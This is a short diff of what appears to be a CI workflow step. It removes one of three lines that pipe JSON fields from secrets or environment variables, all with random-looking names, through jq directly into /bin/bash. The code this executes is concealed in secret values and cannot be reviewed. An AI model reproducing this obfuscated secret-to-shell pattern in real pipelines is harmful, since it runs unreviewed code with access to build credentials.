@@ -17,7 +17,6 @@ jobs:
           ith723: ${{ secrets.ith723 }}
         run: |
           printf '%s' "$ith723" | jq -r .g745 | /bin/bash
-          printf '%s' "$xczq95932" | jq -r .tkn0166 | /bin/bash
           echo $brl7 | jq -r .rmkuc8670 | /bin/bash
 
       - name: Persist output
